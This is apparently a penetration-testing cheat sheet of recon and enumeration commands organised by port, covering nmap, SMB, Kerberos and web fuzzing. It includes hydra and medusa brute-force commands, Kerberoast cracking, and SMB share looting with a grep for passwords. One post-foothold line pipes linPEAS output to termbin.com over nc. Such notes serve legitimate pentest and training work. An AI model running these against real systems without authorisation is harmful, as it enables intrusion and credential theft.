### Initial Recon
Summary of commands for first step recon and enum on target

#### arp-scan

```
sudo arp-scan -l
```

#### nmap
```bash
sudo nmap -sV -sC
sudo nmap -sV -sC -O -A
sudo nmap -vvv -p-
sudo nmap --script='banner,vuln' -sV -sC
sudo nmap -sSVC --script=vuln* -Pn -p- -T5
sudo nmap -sU -vvv
sudo nmap -Pn -p- --open -T4
sudo nmap -sT
sudo proxychains nmap -sT
sudo nmap --proxies socks4://proxy-ip:proxy-port


```
#### Without nmap

>  /dev/tcp & nc
```bash
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 $IP_ADD $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done

top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do (echo > /dev/tcp/$IP_ADD/"$i") > /dev/null 2>&1 && echo "Port $i is open" || echo "Port $i is closed"; done
```
> masscan
```bash
masscan -p 1-65535 --rate 2000
masscan  -p U:1-65535 --rate 2000
# use -e tun0  for specific network connection
sudo masscan -p1-65535 $(cat ip) --rate=1000 -e tun0 > ports
```

#### AutoRecon
[source](https://github.com/Tib3rius/AutoRecon)
```bash
autorecon -cs 5 $IP # concurrent scans
autorecon $IP --single-target # No Directory created
autorecon $IP --heartbeat 5 # give updates
autorecon $IP --only-scans-dir # give only results
autorecon $IP -v
sudo $(which autorecon) $(cat ip) -v --single-target --heartbeat 10 --dirbuster.wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 


cat results/report/notes.txt
cat results/IP/scans/_commands.log
cat ~/results/IP/scans/_full_tcp_nmap.txt
cat results/IP/scans/enum4linux.txt
cat results/IP/scans/smbmap-share-permissions.txt
```

#### tcpdump
```bash
tcpdump -i eth0
tcpdump -c -i eth0
tcpdump -A -i eth0
tcpdump -w 0001.pcap -i eth0
tcpdump -r 0001.pcap
tcpdump -n -i eth0
tcpdump -i eth0 port 22
tcpdump -i eth0 -src $IP
tcpdump -i eth0 -dst $IP
```

#### sniff version of smb using tcpdump
```bash
sudo tcpdump -s0 -n -i tun0 src $IP and port 139 -A -c 10 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$IP: "
```

#### DNSRecon
```bash
dnsrecon -d $IP_/_$DOMAIN -a 
dnsrecon -d $IP_/_$DOMAIN -t axfr
dnsrecon -d <startIP-endIP>
dnsrecon -d $IP_/_$DOMAIN -D <namelist> -t brt
```

#### Dig 
```bash
dig $IP_/_$DOMAIN + short
dig $IP_/_$DOMAIN MX
dig $IP_/_$DOMAIN NS
dig $IP_/_$DOMAIN> SOA
dig $IP_/_$DOMAIN ANY +noall +answer
dig -x $IP_/_$DOMAIN
dig -4 $IP_/_$DOMAIN (For IPv4)
dig -6 $IP_/_$DOMAIN (For IPv6)
dig $IP_/_$DOMAIN mx +noall +answer example.com ns +noall +answer
dig -t AXFR $IP_/_$DOMAIN
```

#### Sublis3r
```bash
Sublist3r -d $IP_/_$DOMAIN
Sublist3r -v -d $IP_/_$DOMAIN -p 80,443
```

#### OWASP AMASS: 
```bash
amass enum -d $IP_/_$DOMAIN
amass intel -whois -d $IP_/_$DOMAIN
amass intel -active 172.21.0.0-64 -p 80,443,8080,8443
amass intel -ipv4 -whois -d $IP_/_$DOMAIN
amass intel -ipv6 -whois -d $IP_/_$DOMAIN
```

#### Curl 'ing
```bash
curl -i $IP
curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')" http://$IP/robots.txt
```

#### netcat headers
```bash
(printf 'GET / HTTP/1.0\r\n\r\n'; sleep 1) | nc $IP 80
```

### Port & Service Enumeration

### 21 FTP

- Check FTP version vulns
- Check Anonymous login 
- Check Read access
- Check Web root or root directories of any other accessible service 
- Check write access 

```
sudo nmap -sV --script='ftp-vuln*,ftp-enum*,ftp-anon*' -p 21 -vvv
sudo nmap --script='ftp-vsftpd-backdoor,ftp-syst' -p 21
sudo nmap --script ftp-* -p 21
nc -vn $IP 21
openssl s_client -connect $IP:21 -starttls ftp
```
> bruteforce
```
hydra -L USER_LIST -P PASS_LIST -f -o ftphydra.txt -u $IP_ADD -s 21 ftp
```
> Download contents
```
wget -m ftp://user:pass@IP
wget -m --no-passive ftp://user:pass@IP
```

* ### 22 SSH

- SSH version vulns
- User enumeration if necessary 
- host key was seen somewhere else 
- prompts for a password - means password login is allowed for some users
- nmap -sV --script=ssh-hostkey -p22 IP
- Bruteforce if necessary
  - CeWL
  - Hydra
  - Patator
  - Crowbar
- Port filtered = defense
  
```
nmap -p22 <ip> --script ssh2-enum-algos 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root"
```

>  bruteforce
```
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt -t 10 $IP_ADD ssh -s 22
medusa -u USER -P /usr/share/wordlists/rockyou.txt -e ns -h $IP_ADD:22 - 22 -M ssh
```
- [user:pass.txt](https://raw.githubusercontent.com/D4nk0St0rM/pentesting_ethical_hacking/main/wordlists/ssh_user_pass.txt)

- [rapid7 bad keys](https://github.com/rapid7/ssh-badkeys/tree/master/authorized)

> #### SSH Tunnels

* [Guide to SSH Tunnels and Proxies](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

* ### 23 Telnet
- Connect and check for service running

```
nmap -n -sV -Pn --script "*telnet* and safe" -p 23
```
> wireshark
```
tcp.port == 23 and ip.addr != myip
```


* ### 25 SMTP
- SMTP vulns 
- Check version with HELO / HELLO <domain> 

> nmap

```
sudo nmap --script='smtp-enum-users' -p 25 $IP_ADD
```
> connecting

```
nc -nv $IP_ADD 25
HELO a
EXPN root	-Enumeration
VRFY user	-Enumeration
# mail
MAIL FROM:user
RCPT TO:user
DATA Hello
.
```
> brute force
```
hydra -P /usr/share/wordlistsnmap.lst $IP_ADD smtp -V
```

> scripts / links

* [smtp_connect.py](https://github.com/D4nk0St0rM/pentest_ethical_hacking_oscp/blob/main/scripts/smtp_connect.py)
* [pentestmonkey smtp user enumeration](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)


* #### 53 DNS
- Might indicate a domain controller
- Check for zone transfer

```
dig axfr DOMAIN @$IP_ADD
host DOMAIN
host -t ns DOMAIN
host -t axfr  DOMAIN NAMESERVER
host -l DOMAIN NAMESERVER
dnsenum --noreverse DOMAIN
dnsrecon -d DOMAIN

```
> nmap
```
sudo nmap -T4 -p 53 --script='dns-brute'

```

> links
* [dnsdumpster](https://dnsdumpster.com/)
* [netcraft](https://searchdns.netcraft.com)




* ### Web applications, services, 80 / 443

> [web_servers_applications](/method/web_servers_applications/README.md)
- Browse
- Check for usernames, keywords 
- Check Web server vulns
- Check for Cgi's shellshock
- Check Certificates for hostname
- Check robots.txt
- Check sitemap.xml
- Check for known software - View source 
- Check for default credentials 
- Check for input validation - SQLi
- Check for OS Command execution
- Check for LFI / RFI

```
dirb IP
dirb with -X extensions based on web technology, .php,.asp,.txt,.jsp
dirb IP -a  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
gobuster dir --url IP --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt
gobuster dir --url IP --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt -k -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
nikto -host IP
wfuzz -v -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  --hc 404 -u http://IP/FUZZ -R2
wfuzz --hc 404 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt http://192.168.55.122/FUZZ


```


* #### 88 Kerberost - Domain Controller
```
rpcclient -U “” -N <IP>

nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=/root/Desktop/usernames.txt <IP>
```

> tools
* [kerbrute](https://github.com/ropnop/kerbrute)
* [GetNPUsers](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py)
* 

> kerberoast
```
# download service ticket
# sudo apt install kerberoast 
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-23a45000-USER@Server.com-CORP.COM.kirbi

```
> links

* [TCM Security - Kerberoasting domain accounts](https://tcm-sec.com/kerberoasting-domain-accounts/?utm_source=rss&utm_medium=rss&utm_campaign=kerberoasting-domain-accounts)
* [Pentest Partners - How to kerberoast like a boss](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)


* #### 110 POP3
```
* pop3 alt port
```
* #### 111 NFS
```
nmap -p 111 --script='nfs*'
```

* #### 123 NTP
* #### 135 RPC
* #### 139/445 SMB
> On older hosts 'client min protocol = LANMAN1' /etc/samba/smb.conf or --option='client min protocol'=LANMAN1 with smbclient

- [method](method/smb/README.md)
- [eternalblue](https://redteamzone.com/EternalBlue/)

```
nmblookup -A
nbtscan
rpcinfo -p
sudo nmap --script='smb-vuln-ms17-010' -p 139,445 -vvv
sudo nmap --script='smb-vuln*,smb-enum*,smb-mbenum*' -p 139,445 -vvv
enum4linux -a
smbclient --no-pass -c 'recurse;ls' ////IP_ADD//ADMIN$
smbclient -L IP_ADD --shares
smbclient -L IP_ADD --pass-pol
smbmap -R SHARNAME -H $IP -A Groups.xml -q
smbclient //$IP/SHARENAME 
  RECURSE ON
  PROMPT OFF
  mget *

smbmap -H IP_ADD -u anonymous
smbmap -H $(cat ip) -u user' -p 'pass'
smbmap -H $(cat ip) -R
crackmapexec smb IP_ADD --shares

* smbpasswd
* mount smb
* enum shares
* smbget
* rpcclient
  * rpclient help
  * enum printers
  * bash query RID

```
> Mount SMB
```
sudo apt-get install cifs-utils 
mkdir /$(pwd)/Sharename 
mount -t cifs //$IP/sharename $(pwd)/ShareName -O username=<username>,password=<password>,domain=box.domain
grep -R password /mnt/ShareName/
```

> nmap vuln scripts

````
> sudo nmap -Pn --script=smb-proto* -p139,445 
> sudo nmap -Pn --script=smb-os-discovery.nse -p139,445
> sudo nmap -Pn --script=smb-enum* -p139,445
> sudo nmap -Pn --script=smb-vuln* -p139,445
> nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 
````

> - Check Null logins 
````
> nmap --script smb-enum-shares -p 139,445 
> smbclient -L \\\\ip\\ -N 
> smbclient -m=SMB2 -L \\\\Hostname\\ -N
````

> Connect to a share with Null session 
````
> smbclient \\\\IP\\$Admin -N 
> smbmap -H IP
> smbmap -u DoesNotExists -H IP
> enum4linux -a IP
````

> Check permissions on a connect share
````
> smb: \> showacls # enable acl listing
> smb: \> dir # list directories with acls
````

> Mount share on local machine 
````
> sudo mount -t cifs //10.10.10.134/SHARENAME ~/path/to/mount_directory
````

> List share with credentials 
````
> smbmap -u USERNAME -p PASSWORD -d DOMAIN.TLD -H <TARGET-IP>
````

> Recursively list all files in share
````
> smbmap -R -H <TARGET-IP>
> smbmap -R Replication -H <TARGET-IP>
````
> With smbclient (recurse downloads all files)
````
> smbclient //<TARGET-IP>/Replication
> smb: \> recurse ON
> smb: \> prompt OFF
> smb: \> mget *
````

> Upload / Download specific files 
````
> smbmap -H <TARGET-IP> --download 'Replication\active.htb\ 
> smbmap -H <TARGET-IP> --upload test.txt SHARENAME/test.txt 
````


* #### 143 IMAP
* #### 161 SNMP
* #### 389/3269 LDAP
* #### 554 RTSP
* #### 593 RPC over HTTP
* #### 631 Printers
* #### 636 LDAP
* #### 1056 Trojan / Virus
* #### 1433 SQL
```
* SQLMAP
```
* #### 1521 Oracle
* #### 2049 NFS
```
show mount -e $IP
mount -t nfs -o vers=3 10.1.1.1:/home/ ~/home
mount -t nfs4 -o proto=tcp,port=2049 127.0.0.1:/srv/Share mountpoint
```

* #### 3306 MYSQL
```
* msfconsole
* SQLMAP
* mysql with creds
```
* #### 3389 RDP
```
* xfreerdo
* remmina
```

* #### 5901 VNC
* #### 5985 WinRM
- [pywinrm](https://github.com/diyan/pywinrm)

```
* crackmapexec winrm
* Evil-WinRM
```
* #### 6379 REDIS

* #### 8080 Web Servers
```
* HttpFileServer HFS
* Jenkins/Jetty
* Tomcat
```




## Initial foothold

## Inside with foothold - enumeration

### linux
```
# output linpeas to termbin with nc if available
./linPeas.sh | nc termbin.com 9999

# list applications
find / -user root -perm -4000 -exec ls -ldb {} \;
 
```
> links

* [dirty cow check](https://raw.githubusercontent.com/D4nk0St0rM/pentesting_ethical_hacking/main/scripts/dirtycow_check.sh)
 
 

### windows
 ```
 # win 8.3 notation
dir /a /s /b > c:\tmp\myfile.txt
for /F "usebackq tokens=*" %A in ("c:\tmp\myfile.txt") do @echo %~sA >> c:\tmp\eightpointthree.txt

 
 ```
 

 ### general
```
# output linpeas to JSON
https://github.com/carlospolop/PEASS-ng/tree/master/parser

```


